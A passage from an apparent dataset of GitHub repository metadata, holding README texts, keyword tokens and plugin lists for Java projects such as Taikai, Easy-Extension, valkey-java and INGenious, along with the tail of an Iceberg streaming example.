'streaming', 'checkpointing', 'mechanismn', 'create', 'database', 'aws', 'glue', 'data', 'catalog', 'name', 'need', 'create', 'emr', 'serverless', 'application', 'application', 'type', 'release', 'version', 'architecture', 'enable', 'runtime', 'enable', 'integration', 'enable', 'desired', 'issue', 'job', 'run', 'using', 'aws', 'cli', 'command', 'remember', 'change', 'desired', 'parameter', 'expected', 'performance', 'around', 'msg', 'per', 'sec', 'use', 'also', 'see', 'cluster', 'autoscaling', 'action', 'running', 'local', 'environment', 'install', 'java', 'sdk', 'like', 'amazon', 'coretto', 'install', 'docker', 'environment', 'open', 'desired', 'ide', 'use', 'ide', 'issue', 'command', 'maven', 'selecting', 'local', 'profile', 'wish', 'use', 'aws', 'glue', 'data', 'catalog', 'remember', 'corresponding', 'permission', 'aws', 'credential', 'avaliable', 'plugins', 'intellij', 'visual', 'studio', 'code', 'helpful', 'start', 'local', 'kafka', 'broker', 'via', 'command', 'run', 'example', 'desired', 'argument', 'remember', 'need', 'add', 'required', 'vm', 'option', 'letting', 'spark', 'work', 'java', 'running', 'kafka', 'producer', 'aws', 'create', 'amazon', 'msk', 'cluster', 'lea', 'two', 'broker', 'using', 'apache', 'zookeeper', 'mode', 'version', 'use', 'instance', 'type', 'use', 'public', 'access', 'choose', 'two', 'private', 'subnets', 'deploy', 'security', 'group', 'remember', 'emr', 'cluster', 'based', 'producer', 'need', 'reach', 'cluster', 'act', 'accordingly', 'security', 'use', 'production', 'secure', 'access', 'cluster', 'choose', 'storage', 'size', 'broker', 'enable', 'cluster', 'configuration', 'use', 'one', 'running', 'kafka', 'producer', 'amazon', 'instance', 'remember', 'change', 'bootstrap', 'connection', 'string', 'need', 'install', 'java', 'using', 'amazon', 'linux', 'instance', 'download', 'jar', 'instance', 'execute', 'producer', 'following', 'command', 'start', 'protocol', 'buffer', 'producer', 'remember', 'instance', 'need', 'network', 'access', 'msk', 'cluster', 'need', 'configure', 'vpc', 'security', 'group', 'cost', 'remember', 'example', 'high', 'throughput', 'scenario', 'therefore', 'config', 'may', 'lead', 'quite', 'big', 'bill', 'deployed', 'top', 'aws', 'remember', 'stop', 'emr', 'serverless', 'application', 'used', 'instance', 'kafka', 'producer', 'delete', 'amazon', 'msk', 'cluster', 'use', 'security', 'code', 'secured', 'way', 'secure', 'apache', 'kafka', 'cluster', 'aware', 'dependency', 'may', 'known', 'vulnerability', 'deploy', 'service', 'top', 'aws', 'configure', 'role', 'using', 'least', 'permission', 'model', 'using', 'iam', 'role', 'amazon', 'lake', 'formation', 'needed', 'contributing', 'see', 'contributing', 'information', 'license', 'library', 'licensed', 'license', 'see', 'license', 'file']","['using', 'use', 'remember', 'apache', 'aws']",12,0,0,"['stream', 'apache', 'iceberg', 'examples', 'use', 'apache', 'spark', 'a', 'note', 'performance', 'iot', 'scenario', 'protocol', 'buffer', 'apache', 'avro', 'json', 'cdc', 'scenario', 'requirement', 'run', 'emr', 'serverless', 'run', 'local', 'environment', 'run', 'kafka', 'producer', 'aws', 'cost', 'security', 'contribute', 'license']",15,"['apache', 'run', 'scenario', 'stream', 'iceberg']",43,0.0,1.0,"[com.github.os72:protoc-jar-maven-plugin,org.apache.avro:avro-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-help-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,16309,25.42708333333333,5.049979516591561,"['Apache Kafka -> https://kafka.apache.org/', 'Apache Spark -> https://spark.apache.org/', 'Apache Iceberg -> https://iceberg.apache.org/', 'Apache Data Fusion Comet -> https://github.com/apache/datafusion-comet', 'Velox -> https://github.com/apache/datafusion-comet', 'Photon -> https://www.databricks.com/product/photon', 'Amazon EMR -> https://aws.amazon.com/emr/', 'Log4j2 -> https://logging.apache.org/log4j/2.12.x/', 'dockerized Kafka -> https://github.com/bitnami/containers/blob/main/bitnami/kafka/', 'Best Practices for Optimizing Apache Iceberg workloads -> https://docs.aws.amazon.com/prescriptive-guidance/latest/apache-iceberg-on-aws/best-practices.html', 'Optimization Strategies for Iceberg Tables -> https://blog.cloudera.com/optimization-strategies-for-iceberg-tables/', 'Protocol Buffers -> https://protobuf.dev/', 'Apache Avro -> https://avro.apache.org/', 'Apache Iceberg Cookbook -> https://tabular.io/apache-iceberg-cookbook/', 'AWS Database Migration Service(DMS) -> https://aws.amazon.com/es/dms/', 'Intellij -> https://www.jetbrains.com/intellij/', 'Visual Studio Code -> https://code.visualstudio.com/', 'NetBeans -> https://apache.netbeans.org/', 'Kafka Connect Tabular Iceberg Connector -> https://github.com/tabular-io/iceberg-kafka-connect/tree/main', 'Amazon Kinesis Firehose -> https://aws.amazon.com/firehose/', 'Amazon Coretto -> https://aws.amazon.com/corretto/', 'Docker -> https://www.docker.com/', 'Intellij -> https://aws.amazon.com/intellij/?pg=developertools', 'Visual Studio Code -> https://aws.amazon.com/visualstudiocode/', 'Apache Zookeeper -> https://zookeeper.apache.org/', 'IAM roles -> https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html', 'Amazon Lake Formation -> https://aws.amazon.com/lake-formation/']",27
enofex/taikai,main,"<p align=""center"">
    <img src=""docs/icon.png""
        height=""150"">
</p>

<p align=""center"">
    <img src=""https://github.com/enofex/taikai/actions/workflows/maven.yml/badge.svg"" />
    <img src=""https://img.shields.io/badge/Java%20Version-17-orange"" />
    <img height=""20"" src=""https://sonarcloud.io/images/project_badges/sonarcloud-orange.svg"">
</p>

# Taikai

Taikai extends the capabilities of the popular ArchUnit library by offering a comprehensive suite of predefined rules tailored for various technologies. It simplifies the enforcement of architectural constraints and best practices in your codebase, ensuring consistency and quality across your projects.

## Maven Usage

Add Taikai as a dependency in your `pom.xml`:

```xml
<dependency>
  <groupId>com.enofex</groupId>
  <artifactId>taikai</artifactId>
  <version>${taikai.version}</version>
  <scope>test</scope>
</dependency>
```

Replace `${taikai.version}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## Gradle Usage

Add Taikai as a dependency in your `build.gradle` file:

```groovy
testImplementation ""com.enofex:taikai:${taikaiVersion}""
```

Replace `${taikaiVersion}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## JUnit 5 Example Test

Here's an example demonstrating the usage of some Taikai rules with JUnit 5. Customize rules as needed using `TaikaiRule.of()`.

```java
@Test
void shouldFulfillConstraints() {
  Taikai.builder()
      .namespace(""com.enofex.taikai"")
      .java(java -> java
          .noUsageOfDeprecatedAPIs()
          .methodsShouldNotDeclareGenericExceptions()
          .utilityClassesShouldBeFinalAndHavePrivateConstructor()
          .imports(imports -> imports
              .shouldHaveNoCycles()
              .shouldNotImport(""..shaded.."")
              .shouldNotImport(""org.junit..""))
          .naming(naming -> naming
              .classesShouldNotMatch("".*Impl"")
              .methodsShouldNotMatch(""^(?!foo$|bar$).*"")
              .fieldsShouldNotMatch("".*(List|Set|Map)$"")
              .fieldsShouldMatch(""com.enofex.taikai.Matcher"", ""matcher"")
              .constantsShouldFollowConventions()
              .interfacesShouldNotHavePrefixI()))
      .logging(logging -> logging
          .loggersShouldFollowConventions(Logger.class, ""logger"", List.of(PRIVATE, FINAL)))      
      .test(test -> test
          .junit5(junit5 -> junit5
              .classesShouldNotBeAnnotatedWithDisabled()
              .methodsShouldNotBeAnnotatedWithDisabled()))
      .spring(spring -> spring
          .noAutowiredFields()
          .boot(boot -> boot
              .springBootApplicationShouldBeIn(""com.enofex.taikai""))
          .configurations(configuration -> configuration
              .namesShouldEndWithConfiguration())
          .controllers(controllers -> controllers
              .shouldBeAnnotatedWithRestController()
              .namesShouldEndWithController()
              .shouldNotDependOnOtherControllers()
              .shouldBePackagePrivate())
          .services(services -> services
              .shouldBeAnnotatedWithService()
              .shouldNotDependOnControllers()
              .namesShouldEndWithService())
          .repositories(repositories -> repositories
              .shouldBeAnnotatedWithRepository()
              .shouldNotDependOnServices()
              .namesShouldEndWithRepository()))      
      .addRule(TaikaiRule.of(...)) // Add custom ArchUnit rule here
      .build()
      .check();
}
```

## User Guide

Explore the complete [documentation](https://github.com/enofex/taikai/blob/main/docs/USERGUIDE.md) for comprehensive information on all available rules.

## Contributing

Interested in contributing? Check out our [Contribution Guidelines](https://github.com/enofex/taikai/blob/main/CONTRIBUTING.md) for details on how to get involved. Note, that we expect everyone to follow the [Code of Conduct](https://github.com/enofex/taikai/blob/main/CODE_OF_CONDUCT.md).

### What you will need

* Git
* Java 17 or higher

### Get the Source Code

Clone the repository

```shell
git clone git@github.com:enofex/taikai.git
cd taikai
```

### Build the code

To compile, test, and build

```shell
./mvnw clean package -B
```
",30,2,1,mit,29.0,"['taikai', 'taikai', 'extends', 'capability', 'popular', 'archunit', 'library', 'offering', 'comprehensive', 'suite', 'predefined', 'rule', 'tailored', 'various', 'technology', 'simplifies', 'enforcement', 'architectural', 'constraint', 'best', 'practice', 'codebase', 'ensuring', 'consistency', 'quality', 'across', 'project', 'maven', 'usage', 'add', 'taikai', 'dependency', 'replace', 'appropriate', 'version', 'defined', 'project', 'ensure', 'required', 'dependency', 'like', 'archunit', 'already', 'declared', 'gradle', 'usage', 'add', 'taikai', 'dependency', 'file', 'replace', 'appropriate', 'version', 'defined', 'project', 'ensure', 'required', 'dependency', 'like', 'archunit', 'already', 'declared', 'junit', 'example', 'test', 'example', 'demonstrating', 'usage', 'taikai', 'rule', 'junit', 'customize', 'rule', 'needed', 'using', 'user', 'guide', 'explore', 'complete', 'documentation', 'comprehensive', 'information', 'available', 'rule', 'contributing', 'interested', 'contributing', 'check', 'contribution', 'guideline', 'detail', 'get', 'involved', 'note', 'expect', 'everyone', 'follow', 'code', 'conduct', 'need', 'git', 'java', 'higher', 'get', 'source', 'code', 'clone', 'repository', 'build', 'code', 'compile', 'test', 'build']","['taikai', 'rule', 'dependency', 'archunit', 'project']",2,0,0,"['taikai', 'maven', 'usage', 'gradle', 'usage', 'junit', 'example', 'test', 'user', 'guide', 'contribute', 'what', 'need', 'get', 'source', 'code', 'build', 'code']",9,"['usage', 'code', 'taikai', 'maven', 'gradle']",5,81.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0,4360,26.3125,7.042755344418052,"['documentation -> https://github.com/enofex/taikai/blob/main/docs/USERGUIDE.md', 'Contribution Guidelines -> https://github.com/enofex/taikai/blob/main/CONTRIBUTING.md', 'Code of Conduct -> https://github.com/enofex/taikai/blob/main/CODE_OF_CONDUCT.md']",3
xiaoshicae/easy-extension,main,"# Easy-Extension
Easy-Extension框架目标是提高`复杂系统的扩展性`，适用于系统有多个接入方，且不同接入方有定制化的扩展诉求。例如电商交易，履约等中台系统。

# 框架特点
* 轻量易用
* 可以实现业务逻辑和平台逻辑分离，提高提供扩展性和稳定性

# 框架解决的业务场景
![](/doc/target.png)

# 框架使用Demo
```java
@RestController
@RequestMapping(""/api"")
public class Controller {
    // 动态注入扩展点1，不同业务和能力会有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入优先级最高的实现
    // 未匹配到任何业务和能力的实现，会走默认能力进行兜底
    @ExtensionInject
    private Ext1 ext1;

    // 动态注入扩展点2，不同业务会和能力有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入优先级最高的实现
    // 未匹配到任何业务和能力的实现，会走默认能力进行兜底
    @ExtensionInject
    private Ext2 ext2;

    // 动态注入扩展点3，不同业务会和能力有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入所有匹配到的实现
    // 包括默认能力
    @ExtensionInject
    private List<Ext3> ext3List;

    @RequestMapping(""/process"")
    public String process() {
        String s1 = ext1.doSomething1();
        String s2 = ext2.doSomething2();
        List<String> s3List = new ArrayList<>();
        for (Ext3 ext3 : ext3List) {
            s3List.add(ext3.doSomething3());
        }
        return String.format(""res: ext1 = %s, ext2 = %s, ext3List = %s"", s1, s2, Arrays.toString(s3List));
    }
}
```

# 文档
* 完整文档请参考: [wiki](https://github.com/xiaoshicae/easy-extension/wiki)
* go版本的easy-extension实现可以参考: [go-easy-extension](https://github.com/xiaoshicae/go-easy-extension)

# 代码样例
样例源码请参考: [easy-extension-sample](https://github.com/xiaoshicae/easy-extension-sample)

# License
Easy-Extension遵循Apache开源协议，具体内容请参考LICENSE文件。
",2,0,4,apache-2.0,10.0,"['wiki', 'license']","['wiki', 'license']",0,2,0,['license'],7,['license'],1,13.0,3.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,2.0,1.0,1405,67.0,7.231343283582089,"['wiki -> https://github.com/xiaoshicae/easy-extension/wiki', 'go-easy-extension -> https://github.com/xiaoshicae/go-easy-extension', 'easy-extension-sample -> https://github.com/xiaoshicae/easy-extension-sample']",3
valkey-io/valkey-java,master,"# Valkey-Java
valkey-java is [Valkey](https://github.com/valkey-io/valkey)'s Java client, derived from [Jedis](https://github.com/redis/jedis) fork, dedicated to maintaining simplicity and high performance.


# Getting started
Add the following dependencies to your `pom.xml` file, you can find the latest version of valkey-java at [Maven Central](https://central.sonatype.com/artifact/io.valkey/valkey-java).
```
<dependency>
    <groupId>io.valkey</groupId>
    <artifactId>valkey-java</artifactId>
    <version>5.3.0</version>
</dependency>
```

## Connect to Valkey

```java
public class ValkeyTest {
    // can be static or singleton, thread safety.
    private static io.valkey.JedisPool jedisPool;

    public static void main(String[] args) {
        io.valkey.JedisPoolConfig config = new io.valkey.JedisPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);
        jedisPool = new io.valkey.JedisPool(config, < host >, <port >, <timeout >, <password >);
        try (io.valkey.Jedis jedis = jedisPool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }
        jedisPool.close(); // when app exit, close the resource.
    }
}
```

## Connect to the Valkey cluster

```java
import java.util.HashSet;
import java.util.Set;

import io.valkey.HostAndPort;

public class ValkeyClusterTest {
    private static final int DEFAULT_TIMEOUT = 2000;
    private static final int DEFAULT_REDIRECTIONS = 5;
    private static io.valkey.JedisCluster jc; // be static or singleton, thread safety.

    public static void main(String[] args) {
        io.valkey.ConnectionPoolConfig config = new io.valkey.ConnectionPoolConfig();
        // It is recommended that you set maxTotal = maxIdle = 2*minIdle for best performance
        // In cluster mode, please note that each business machine will contain up to maxTotal links,
        // and the total number of connections = maxTotal * number of machines
        config.setMaxTotal(32);
        config.setMaxIdle(32);
        config.setMinIdle(16);

        Set<HostAndPort> jedisClusterNode = new HashSet<HostAndPort>();
        jedisClusterNode.add(new HostAndPort(host, port));
        jc = new io.valkey.JedisCluster(jedisClusterNode, DEFAULT_TIMEOUT, DEFAULT_TIMEOUT, DEFAULT_REDIRECTIONS,
            password, null, config);

        jc.set(""key"", ""value""); // Note that there is no need to call jc.close() here, 
        // the connection recycling is actively completed internally.
        System.out.println(jc.get(""key""));

        jc.close(); // when app exit, close the resource.
    }
}
```

## Connect using TLS method

```java
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.KeyStore;
import java.security.SecureRandom;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;

import org.apache.commons.pool2.impl.GenericObjectPoolConfig;

public class ValkeySSLTest {
    private static SSLSocketFactory createTrustStoreSSLSocketFactory(String jksFile) throws Exception {
        KeyStore trustStore = KeyStore.getInstance(""jks"");
        InputStream inputStream = null;
        try {
            inputStream = new FileInputStream(jksFile);
            trustStore.load(inputStream, null);
        } finally {
            inputStream.close();
        }

        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(""PKIX"");
        trustManagerFactory.init(trustStore);
        TrustManager[] trustManagers = trustManagerFactory.getTrustManagers();

        SSLContext sslContext = SSLContext.getInstance(""TLS"");
        sslContext.init(null, trustManagers, new SecureRandom());
        return sslContext.getSocketFactory();
    }

    public static void main(String[] args) throws Exception {
        // When you don't have a jks file, just set sslSocketFactory to null.
        final SSLSocketFactory sslSocketFactory = createTrustStoreSSLSocketFactory( < your_jks_file_path >);
        io.valkey.JedisPool jedisPool = new io.valkey.JedisPool(new GenericObjectPoolConfig(), < host >,
            <port >, <timeout >, <password >, 0, true, sslSocketFactory, null, null);

        try (io.valkey.Jedis jedis = pool.getResource()) {
            jedis.set(""key"", ""value"");
            System.out.println(jedis.get(""key""));
        } catch (Exception e) {
            e.printStackTrace();
        }

        jedisPool.close(); // when app exit, close the resource.
    }
}
```

# Pool Configuration
The following are the common parameters of apache common-pool and their meanings：

| Parameter | Meanings                                                                                                                                                                                                         | Default value | Recommended value              |
| --- |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|--------------------------------|
|connectionTimeout| Initialize the timeout period for connecting to the cluster, such as the timeout period for reconnecting the cluster at startup and after the TCP connect is disconnected.                                       | 2000          | 5000                           |
|soTimeout| The timeout period for API access. For example, the timeout period for operations such as set and get.                                                                                                           | 2000          | 2000                           |
|maxTotal/maxIdle/minIdle | standalone mode: the connection to redis; cluster mode: The number of connections to a node in the cluster                                                                                                       | 8，8，0         | MaxTotal = MaxIdle = 2*MinIdle |
|blockWhenExhausted| When the resource pool is used up, whether the caller needs to wait or not. If not, an exception with insufficient connection is returned. The following maxWaitMillis takes effect only when the value is true. | true          | true                           |
|maxWaitMillis| The maximum wait time (in milliseconds) of the caller when the resource pool connection is exhausted.                                                                                                            | -1            | depending on your business     |
|testOnBorrow| Whether to check the validity of the connection (send the ping command) when borrowing the connection from the resource pool. The detected invalid connection will be removed.                                   | false         | false                          |
|testOnReturn| Whether to check the validity of the connection (send a ping command) when returning the connection to the resource pool. The detected invalid connection will be removed.                                       | false         | false                          |
|testOnCreate| If you create a new connection when borrowing a connection, we recommend that you disable it if you check whether the connection validity is performed (send a ping command).                                    | false         | false                          |
|testWhileIdle| Whether to check the validity of the connection (send a ping command) when detecting idle connections. If the connection is invalid, it will be closed.                                                          | true          | true                           |
|timeBetweenEvictionRunsMillis| The detection period of idle resources. Unit: milliseconds.                                                                                                                                                      | 30000         | 30000                          |
|minEvictableIdleTimeMillis| The minimum idle time (in milliseconds) of resources in the resource pool. When this value is reached, idle resources are removed. Unit: milliseconds.| 60000         | 60000                          |
|numTestsPerEvictionRun|The number of resources that are detected each time when idle resources are detected.| -1            | -1                             |
|evictionPolicy|Set the evict class, including the elimination algorithm. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|         DefaultEvictionPolicy      |     DefaultEvictionPolicy                           |
|evictionPolicyClassName|Set the evict class name. The default implementation is DefaultEvictionPolicy, which is eliminated according to the idle time.|      DefaultEvictionPolicy         |         DefaultEvictionPolicy                       |
|evictorShutdownTimeoutMillis|The default waiting time when you exit the evictor.Unit: milliseconds.    |       10000        |                  10000              |
|fairness|When the connection pool is exhausted, multiple threads may block waiting for resources. If the fairness is true, threads can obtain resources in sequence.|        false       |           false                     |
|lifo|When multiple connections are available in the connection pool, a connection is selected based on this value. (Last in, First out)|         true      |        true                        |

# Roadmap
The following is what we plan to complete in the future
1. Support new API for Valkey
2. Support asynchronous
3. Reduce the number of client links in cluster mode
4. Tracing mode can record the access latency of each API.

# Contribution
Contributions are always welcome. If you discover bugs or have new ideas, please open the issue or submit a PR.

# LICENSE
[MIT](LICENSE)",2,0,5,mit,2.0,"['valkey', 'java', 'client', 'derived', 'jedis', 'fork', 'dedicated', 'maintaining', 'simplicity', 'high', 'performance', 'getting', 'started', 'add', 'following', 'dependency', 'file', 'find', 'latest', 'version', 'maven', 'central', 'connect', 'valkey', 'connect', 'valkey', 'cluster', 'connect', 'using', 'tl', 'method', 'pool', 'configuration', 'following', 'common', 'parameter', 'apache', 'parameter', 'meaning', 'default', 'value', 'recommended', 'value', 'initialize', 'timeout', 'period', 'connecting', 'cluster', 'timeout', 'period', 'reconnecting', 'cluster', 'startup', 'tcp', 'connect', 'disconnected', 'timeout', 'period', 'api', 'access', 'example', 'timeout', 'period', 'operation', 'set', 'get', 'standalone', 'mode', 'connection', 'redis', 'cluster', 'mode', 'number', 'connection', 'node', 'cluster', 'maxtotal', 'maxidle', 'minidle', 'resource', 'pool', 'used', 'whether', 'caller', 'need', 'wait', 'exception', 'insufficient', 'connection', 'returned', 'following', 'maxwaitmillis', 'take', 'effect', 'value', 'true', 'true', 'true', 'maximum', 'wait', 'time', 'millisecond', 'caller', 'resource', 'pool', 'connection', 'exhausted', 'depending', 'business', 'whether', 'check', 'validity', 'connection', 'send', 'ping', 'command', 'borrowing', 'connection', 'resource', 'pool', 'detected', 'invalid', 'connection', 'removed', 'false', 'false', 'whether', 'check', 'validity', 'connection', 'send', 'ping', 'command', 'returning', 'connection', 'resource', 'pool', 'detected', 'invalid', 'connection', 'removed', 'false', 'false', 'create', 'new', 'connection', 'borrowing', 'connection', 'recommend', 'disable', 'check', 'whether', 'connection', 'validity', 'performed', 'send', 'ping', 'command', 'false', 'false', 'whether', 'check', 'validity', 'connection', 'send', 'ping', 'command', 'detecting', 'idle', 'connection', 'connection', 'invalid', 'closed', 'true', 'true', 'detection', 'period', 'idle', 'resource', 'unit', 'millisecond', 'minimum', 'idle', 'time', 'millisecond', 'resource', 'resource', 'pool', 'value', 'reached', 'idle', 'resource', 'removed', 'unit', 'number', 'resource', 'detected', 'time', 'idle', 'resource', 'evict', 'class', 'including', 'elimination', 'algorithm', 'default', 'implementation', 'defaultevictionpolicy', 'eliminated', 'according', 'idle', 'defaultevictionpolicy', 'defaultevictionpolicy', 'evict', 'class', 'name', 'default', 'implementation', 'defaultevictionpolicy', 'eliminated', 'according', 'idle', 'defaultevictionpolicy', 'defaultevictionpolicy', 'default', 'waiting', 'time', 'exit', 'millisecond', 'connection', 'pool', 'exhausted', 'multiple', 'thread', 'may', 'block', 'waiting', 'resource', 'fairness', 'true', 'thread', 'obtain', 'resource', 'false', 'false', 'multiple', 'connection', 'available', 'connection', 'pool', 'connection', 'selected', 'based', 'value', 'last', 'first', 'true', 'true', 'roadmap', 'following', 'plan', 'complete', 'future', 'support', 'new', 'api', 'valkey', 'support', 'asynchronous', 'reduce', 'number', 'client', 'link', 'cluster', 'mode', 'tracing', 'mode', 'record', 'access', 'latency', 'api', 'contribution', 'contribution', 'always', 'welcome', 'discover', 'bug', 'new', 'idea', 'please', 'open', 'issue', 'submit', 'pr', 'license', 'mit']","['connection', 'resource', 'pool', 'true', 'false']",1,0,0,"['get', 'start', 'connect', 'valkey', 'connect', 'valkey', 'cluster', 'connect', 'use', 'tl', 'method', 'pool', 'configuration', 'roadmap', 'contribution', 'license']",9,"['connect', 'valkey', 'get', 'start', 'cluster']",4,4013.0,1.0,"[com.googlecode.maven-java-formatter-plugin:maven-java-formatter-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,10069,25.75,5.902912621359223,"['Valkey -> https://github.com/valkey-io/valkey', 'Jedis -> https://github.com/redis/jedis', 'Maven Central -> https://central.sonatype.com/artifact/io.valkey/valkey-java']",3
ing-bank/INGenious,main,"# INGenious Playwright Studio - Test Automation for Everyone

[![Build INGenious Source Code](https://github.com/ing-bank/INGenious/actions/workflows/maven.yml/badge.svg)](https://github.com/ing-bank/INGenious/actions/workflows/maven.yml)
![Static Badge](https://img.shields.io/badge/Version-1.0-%23FF6200)

--------------------------------------------------------------------

<span style=""color:#FF6200;width:100px"">**INGenious**</span> enables easy and effective test automation for **everyone.**



Developed and perfected by <span style=""color:#FF6200;width:100px"">**ING Bank**</span> for over 4 years of real-world usage, **INGenious** is now open-source and available to everyone. Designed to simplify and streamline test automation, this robust solution empowers teams of all sizes to achieve efficient, high-quality testing. By joining the global testing community, ING aims to collaborate, innovate, and elevate automated testing together.

> [!NOTE]
> It provides an easy and simple way to create highly reliable automated tests. It leverages the power of __Playwright-Java__ and combines it with a user-friendly IDE which makes it a highly effective solution. 
> The idea behind INGenious is to enable engineers, business analysts and even non-technical stakeholders to design high quality automated tests which focus on the business goals, without them having to worry about coding.


:atom: **The complete documentation is available here :** https://ing-bank.github.io/ingenious-doc/

## At a Glance


-   :white_check_mark: __Get Started in 5 minutes__

    Download <span style=""color:#FF6200"">INGenious</span> and get up and running in minutes. Create and execute your test cases in no time.

    [:arrow_right: Getting started](https://ing-bank.github.io/ingenious-doc/gettingstarted/)

-   :white_check_mark: __No Code/Low Code__

    <span style=""color:#FF6200"">INGenious</span> comes with an intuitive IDE which makes test designing simple, easy and fun.

    [:arrow_right: IDE](https://ing-bank.github.io/ingenious-doc/knowyourframework/)

-   :white_check_mark: __Browser Automation__

    <span style=""color:#FF6200"">INGenious</span> leverages the power of **Playwright** to create robust and stable browser tests.

    [:arrow_right: Browser Testing](https://ing-bank.github.io/ingenious-doc/browsertesting/)

-   :white_check_mark: __API Automation__

    <span style=""color:#FF6200"">INGenious</span> leverages **Java HTTP Client** to create API tests.

    [:arrow_right: API Testing](https://ing-bank.github.io/ingenious-doc/api/)



-   :white_check_mark: __Full customization__

    <span style=""color:#FF6200"">INGenious</span> comes with a full blown `maven` project which can be easily customized based on project needs.

    [:arrow_right: Customizations](https://ing-bank.github.io/ingenious-doc/customizations/)

-   :white_check_mark: __Integrated BDD__

    <span style=""color:#FF6200"">INGenious</span> supports BDD way of working and comes with a built-in feature file editor.

    [:arrow_right: BDD Support](https://ing-bank.github.io/ingenious-doc/bdd/)

-   :white_check_mark: __Seamless Azure Test Plan Integration__

    Test Case and Defect Management via Azure DevOps Test Plan can be done with <span style=""color:#FF6200"">INGenious</span> very easily

    [:arrow_right: Test Plan](https://ing-bank.github.io/ingenious-doc/testplan/)

-   :white_check_mark: __Seamless integration with any CI tool__

    <span style=""color:#FF6200"">INGenious</span> is built in Java and has a strong command line interface. This makes integration with any CI tool, very easy.

    [:arrow_right: Integration](https://ing-bank.github.io/ingenious-doc/ci/)

-   :white_check_mark: __Open Source, MIT__

    <span style=""color:#FF6200"">INGenious</span> is licensed under MIT and available on **GitHub**

    [:arrow_right: License](https://github.com/ing-bank/INGenious)







--------

## Features coming soon

INGenious will also cater to the following types of testing. Currently, these are in the beta-testing stage in ING.



:iphone: __Mobile App__ testing

:open_file_folder: __Database__ testing




--------


",1,12,3,mit,9.0,"['ingenious', 'playwright', 'studio', 'test', 'automation', 'everyone', 'ingenious', 'enables', 'easy', 'effective', 'test', 'automation', 'everyone', 'developed', 'perfected', 'ing', 'bank', 'year', 'usage', 'ingenious', 'available', 'everyone', 'designed', 'simplify', 'streamline', 'test', 'automation', 'robust', 'solution', 'empowers', 'team', 'size', 'achieve', 'efficient', 'testing', 'joining', 'global', 'testing', 'community', 'ing', 'aim', 'collaborate', 'innovate', 'elevate', 'automated', 'testing', 'together', 'note', 'provides', 'easy', 'simple', 'way', 'create', 'highly', 'reliable', 'automated', 'test', 'leverage', 'power', 'combine', 'ide', 'make', 'highly', 'effective', 'solution', 'idea', 'behind', 'ingenious', 'enable', 'engineer', 'business', 'analyst', 'even', 'stakeholder', 'design', 'high', 'quality', 'automated', 'test', 'focus', 'business', 'goal', 'without', 'worry', 'coding', 'atom', 'complete', 'documentation', 'available', 'http', 'glance', 'get', 'started', 'minute', 'download', 'ingenious', 'get', 'running', 'minute', 'create', 'execute', 'test', 'case', 'time', 'getting', 'started', 'code', 'ingenious', 'come', 'intuitive', 'ide', 'make', 'test', 'designing', 'simple', 'easy', 'fun', 'ide', 'browser', 'automation', 'ingenious', 'leverage', 'power', 'playwright', 'create', 'robust', 'stable', 'browser', 'test', 'browser', 'testing', 'api', 'automation', 'ingenious', 'leverage', 'java', 'http', 'client', 'create', 'api', 'test', 'api', 'testing', 'full', 'customization', 'ingenious', 'come', 'full', 'blown', 'project', 'easily', 'customized', 'based', 'project', 'need', 'customizations', 'integrated', 'bdd', 'ingenious', 'support', 'bdd', 'way', 'working', 'come', 'feature', 'file', 'editor', 'bdd', 'support', 'seamless', 'azure', 'test', 'plan', 'integration', 'test', 'case', 'defect', 'management', 'via', 'azure', 'devops', 'test', 'plan', 'done', 'ingenious', 'easily', 'test', 'plan', 'seamless', 'integration', 'ci', 'tool', 'ingenious', 'built', 'java', 'strong', 'command', 'line', 'interface', 'make', 'integration', 'ci', 'tool', 'easy', 'integration', 'open', 'source', 'mit', 'ingenious', 'licensed', 'mit', 'available', 'github', 'license', 'feature', 'coming', 'soon', 'ingenious', 'also', 'cater', 'following', 'type', 'testing', 'currently', 'stage', 'ing', 'iphone', 'mobile', 'app', 'testing', 'database', 'testing']","['ingenious', 'test', 'testing', 'automation', 'easy']",0,0,0,"['ingenious', 'playwright', 'studio', 'test', 'automation', 'everyone', 'at', 'glance', 'feature', 'come', 'soon']",3,"['ingenious', 'playwright', 'studio', 'test', 